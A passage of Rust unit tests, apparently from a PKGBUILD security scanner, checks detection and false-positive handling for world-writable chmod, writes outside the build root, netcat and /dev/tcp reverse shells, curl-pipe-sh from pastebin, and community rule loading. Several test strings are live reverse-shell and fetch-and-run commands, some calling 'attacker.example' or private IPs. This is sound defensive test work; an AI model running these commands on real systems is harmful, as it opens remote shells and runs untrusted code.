            (r#"chmod a+w "$pkgdir/opt/app""#, "PERM-002"),
            (r#"chmod ugo+w "$pkgdir/opt/app""#, "PERM-002"),
            (r#"chmod -R o+w "$pkgdir/opt/app""#, "PERM-002"),
            (r#"chmod o=rw "$pkgdir/etc/f""#, "PERM-002"),
        ];
        for (src, id) in cases {
            let m = engine.match_content(src, FileType::Pkgbuild);
            assert!(
                m.iter().any(|x| &x.rule_id.as_str() == id),
                "{id} missed world-writable: {src} -> {m:?}"
            );
        }
    }

    #[test]
    fn shipped_permission_rules_ignore_ordinary_modes() {
        // This is the whole difficulty of the rule (issue #8). These forms are
        // in essentially every PKGBUILD ever written; a rule that fires on them
        // teaches people to ignore the tool.
        let engine = perm_engine();
        for src in [
            r#"chmod 755 "$pkgdir/usr/bin/foo""#,
            r#"chmod 0755 "$pkgdir/usr/bin/foo""#,
            r#"chmod 644 "$pkgdir/usr/share/foo/data""#,
            r#"chmod 0644 "$pkgdir/usr/share/foo/data""#,
            r#"chmod 700 "$pkgdir/var/lib/foo""#,
            r#"chmod 600 "$pkgdir/etc/foo.key""#,
            r#"chmod 111 "$pkgdir/opt/x""#,
            r#"chmod -R 755 "$pkgdir/usr/share/foo""#,
            r#"chmod 1777 "$pkgdir/var/tmp/foo""#,
            r#"install -Dm644 LICENSE "$pkgdir/usr/share/licenses/foo/LICENSE""#,
            r#"install -Dm755 target/release/foo "$pkgdir/usr/bin/foo""#,
            r#"install -m 644 README "$pkgdir/usr/share/doc/foo/README""#,
            r#"chmod u+x "$pkgdir/usr/bin/foo""#,
            r#"chmod +x "$pkgdir/usr/bin/foo""#,
            r#"chmod a+r "$pkgdir/usr/share/foo/data""#,
            r#"chmod g+w "$pkgdir/var/lib/foo""#,
            r#"chmod u+rw "$pkgdir/etc/foo""#,
            r#"chmod o-w "$pkgdir/etc/foo""#,
            r#"chmod a-w "$pkgdir/etc/foo""#,
        ] {
            let m = engine.match_content(src, FileType::Pkgbuild);
            let hits: Vec<&str> = m
                .iter()
                .map(|x| x.rule_id.as_str())
                .filter(|id| id.starts_with("PERM-"))
                .collect();
            assert!(
                hits.is_empty(),
                "ordinary mode must not fire a PERM rule: {src} -> {hits:?}"
            );
        }
    }

    #[test]
    fn escape001_catches_writes_outside_the_build_root() {
        let engine = RuleEngine::default();
        for src in [
            r#"tar xf payload.tar.gz -C /"#,
            r#"tar -xzf blob.tar.gz -C /usr"#,
            r#"bsdtar xf x.tar -C /etc/"#,
            r#"unzip -q payload.zip -d /opt"#,
            r#"install -Dm755 helper /usr/bin/helper"#,
        ] {
            let m = engine.match_content(src, FileType::Pkgbuild);
            assert!(
                m.iter().any(|x| x.rule_id == "ESCAPE-001"),
                "ESCAPE-001 missed a write outside the build root: {src} -> {m:?}"
            );
        }
    }

    #[test]
    fn escape001_is_quiet_on_normal_packaging() {
        // These are what essentially every PKGBUILD does. A rule that fires on
        // them is worse than no rule.
        let engine = RuleEngine::default();
        for src in [
            r#"tar xf source.tar.gz -C "$srcdir""#,
            r#"tar -xzf x.tar.gz -C "$pkgdir/usr/share""#,
            r#"unzip -q app.zip -d "$srcdir/app""#,
            r#"install -Dm755 tool "$pkgdir/usr/bin/tool""#,
            r#"install -Dm644 LICENSE "$pkgdir/usr/share/licenses/$pkgname/LICENSE""#,
            r#"cp -a build/. "$pkgdir/usr/lib/foo/""#,
            r#"mv "$srcdir/x" "$pkgdir/opt/x""#,
            r#"install -d "$pkgdir/etc/foo""#,
            r#"make DESTDIR="$pkgdir" install"#,
            r#"cp config.example "$pkgdir/etc/foo/config""#,
            // Reading FROM an absolute path is fine; only writing TO one is not.
            r#"install -Dm644 /usr/share/foo/template "$pkgdir/etc/foo.conf""#,
            r#"cp /etc/ssl/certs/ca-bundle.crt "$srcdir/""#,
        ] {
            let m = engine.match_content(src, FileType::Pkgbuild);
            let hits: Vec<&str> = m
                .iter()
                .map(|x| x.rule_id.as_str())
                .filter(|id| id.starts_with("ESCAPE-"))
                .collect();
            assert!(
                hits.is_empty(),
                "ESCAPE-001 false positive on ordinary packaging: {src} -> {hits:?}"
            );
        }
    }

    #[test]
    fn test_shell002_no_fp_on_words_ending_in_nc() {
        // Issue #32: `nc\s+.*-c\s+` matched the `nc` at the END of `MEGAsync`,
        // turning a routine submodule checkout into a Critical reverse shell.
        // Any word ending in `nc` followed by a `-c`/`-e` flag is the same trap.
        let engine = RuleEngine::default();
        for s in [
            "git -C MEGAsync -c protocol.file.allow='always' submodule update",
            "git -C MEGAsync -c protocol.file.allow=always submodule update --init",
            "cd sync -c foo",
            "./configure --with-func -e something",
            "meson setup builddir -Dsync -c release",
        ] {
            let m = engine.match_content(s, FileType::Pkgbuild);
            assert!(
                !m.iter().any(|x| x.rule_id == "SHELL-002"),
                "SHELL-002 false positive on: {s} -> {m:?}"
            );
        }
    }

    #[test]
    fn test_shell002_still_catches_real_netcat_shells() {
        let engine = RuleEngine::default();
        for s in [
            "nc -e /bin/sh 10.0.0.1 4444",
            "nc -c /bin/bash attacker.example 9001",
            "ncat -e /bin/bash 10.0.0.1 4444",
            "netcat -e /bin/sh 1.2.3.4 1234",
            "/usr/bin/nc -e /bin/sh 10.0.0.1 4444",
            "nc -nve /bin/sh 10.0.0.1 4444",
            "ncat --sh-exec '/bin/bash' 10.0.0.1 4444",
            "cat /etc/passwd | nc -e /bin/sh 10.0.0.1 4444",
            "foo && nc -e /bin/sh 10.0.0.1 4444",
        ] {
            let m = engine.match_content(s, FileType::Pkgbuild);
            assert!(
                m.iter().any(|x| x.rule_id == "SHELL-002"),
                "SHELL-002 missed a real netcat shell: {s} -> {m:?}"
            );
        }
    }

    #[test]
    fn test_shell002_does_not_borrow_a_flag_from_a_later_command() {
        // The execute flag must belong to the netcat invocation itself. A
        // benign `-c` on a *different* command later in the same line must not
        // complete the match.
        let engine = RuleEngine::default();
        for s in [
            "nc -z example.com 80; git -c core.pager=cat log",
            "nc -zv host 443 && git -c protocol.file.allow=always submodule update",
            "nc -z host 80 | grep -c open",
        ] {
            let m = engine.match_content(s, FileType::Pkgbuild);
            assert!(
                !m.iter().any(|x| x.rule_id == "SHELL-002"),
                "SHELL-002 borrowed a flag across a separator: {s} -> {m:?}"
            );
        }
    }

    // ---- community rule loading: collisions, privilege, bad input ----

    fn write_rule(dir: &Path, file: &str, body: &str) {
        std::fs::write(dir.join(file), body).unwrap();
    }

    const OK_RULE: &str = r#"
[[rule]]
id = "COMM-001"
name = "n"
description = "d"
severity = "high"
category = "malicious_code"
recommendation = "r"
[[rule.patterns]]
type = "regex"
pattern = "zzzmarker"
"#;

    #[test]
    fn community_rule_cannot_shadow_or_lower_a_builtin() {
        let dir = tempfile::tempdir().unwrap();
        write_rule(
            dir.path(),
            "evil.toml",
            r#"
[[rule]]
id = "SHELL-001"
name = "lowered"
description = "d"
severity = "info"
category = "malicious_code"
recommendation = "r"
[[rule.patterns]]
type = "regex"
pattern = "neverMatchesAnything12345"
"#,
        );
        let mut engine = RuleEngine::default();
        engine.load_rules_from_dir(dir.path()).unwrap();
        let rule = engine.get_rule("SHELL-001").unwrap();
        assert_eq!(rule.severity, Severity::Critical, "builtin was lowered");
        assert_ne!(rule.name, "lowered");
        let m = engine.match_content("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", FileType::Pkgbuild);
        assert!(m.iter().any(|x| x.rule_id == "SHELL-001"));
    }

    #[test]
    fn add_rule_rejects_duplicate_id() {
        let mut engine = RuleEngine::default();
        let mut dup = get_builtin_rules().remove(0);
        dup.severity = Severity::Info;
        assert!(engine.add_rule(dup).is_err());
    }

    #[test]
    fn catalog_and_engine_share_the_vetting_loader() {
        let dir = tempfile::tempdir().unwrap();
        write_rule(
            dir.path(),
            "a.toml",
            &OK_RULE.replace("COMM-001", "SHELL-001"),
        );
        write_rule(dir.path(), "b.toml", OK_RULE);
        let cat = crate::catalog::Catalog::load_with(&[dir.path().to_path_buf()]);
        assert_eq!(cat.validate(), Ok(()));
        assert!(cat.get("COMM-001").is_some());
        assert_eq!(cat.get("SHELL-001").unwrap().owner, "rules");
    }

    #[test]
    fn user_rule_dirs_for_root_excludes_user_config() {
        let root = user_rule_dirs_for(true);
        assert_eq!(root.len(), 2);
        assert!(root
            .iter()
            .all(|p| p.starts_with("/usr") || p.starts_with("/etc")));
        assert!(user_rule_dirs_for(false).len() >= root.len());
    }

    #[test]
    fn bad_regex_skips_only_its_own_rule() {
        let dir = tempfile::tempdir().unwrap();
        write_rule(
            dir.path(),
            "a_bad.toml",
            &OK_RULE
                .replace("COMM-001", "COMM-BAD")
                .replace("zzzmarker", "(unclosed"),
        );
        write_rule(dir.path(), "b_good.toml", OK_RULE);
        let mut engine = RuleEngine::new();
        engine.load_rules_from_dir(dir.path()).unwrap();
        assert!(engine.get_rule("COMM-BAD").is_none());
        assert!(engine.get_rule("COMM-001").is_some());
    }

    #[test]
    fn unknown_keys_skip_the_file() {
        let dir = tempfile::tempdir().unwrap();
        write_rule(
            dir.path(),
            "typo.toml",
            &OK_RULE
                .replace("COMM-001", "COMM-TYPO")
                .replace("[[rule.patterns]]", "[[rule.patern]]"),
        );
        write_rule(
            dir.path(),
            "ft.toml",
            &OK_RULE
                .replace("COMM-001", "COMM-FT")
                .replace("severity", "file_type = \"pkgbuild\"\nseverity"),
        );
        write_rule(dir.path(), "ok.toml", OK_RULE);
        let mut engine = RuleEngine::new();
        engine.load_rules_from_dir(dir.path()).unwrap();
        assert!(engine.get_rule("COMM-TYPO").is_none());
        assert!(engine.get_rule("COMM-FT").is_none());
        assert!(engine.get_rule("COMM-001").is_some());
    }

    #[test]
    fn rule_with_no_patterns_is_rejected() {
        let dir = tempfile::tempdir().unwrap();
        let no_pat = OK_RULE.replace("COMM-001", "COMM-EMPTY").replace(
            "[[rule.patterns]]\ntype = \"regex\"\npattern = \"zzzmarker\"\n",
            "",
        );
        write_rule(dir.path(), "e.toml", &no_pat);
        let mut engine = RuleEngine::new();
        engine.load_rules_from_dir(dir.path()).unwrap();
        assert!(engine.get_rule("COMM-EMPTY").is_none());
    }

    #[test]
    fn source_file_rules_fire_on_sidecars_and_pkgbuild_rules_apply_too() {
        let dir = tempfile::tempdir().unwrap();
        write_rule(
            dir.path(),
            "sf.toml",
            &OK_RULE.replace("severity", "file_types = [\"source_file\"]\nseverity"),
        );
        let mut engine = RuleEngine::default();
        engine.load_rules_from_dir(dir.path()).unwrap();
        let m = engine.match_content("run zzzmarker", FileType::SourceFile);
        assert!(m.iter().any(|x| x.rule_id == "COMM-001"));
        // A built-in PKGBUILD rule also covers sidecars.
        let m = engine.match_content(
            "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
            FileType::SourceFile,
        );
        assert!(m.iter().any(|x| x.rule_id == "SHELL-001"));
    }

    #[test]
    fn two_patterns_on_one_line_report_once() {
        let engine = RuleEngine::default();
        let line = "curl https://pastebin.com/raw/abc | sh";
        let m = engine.match_content(line, FileType::Pkgbuild);
        let n = m.iter().filter(|x| x.rule_id == "PASTE-001").count();
        assert_eq!(n, 1, "PASTE-001 reported {n}x for one line: {m:?}");
    }
}
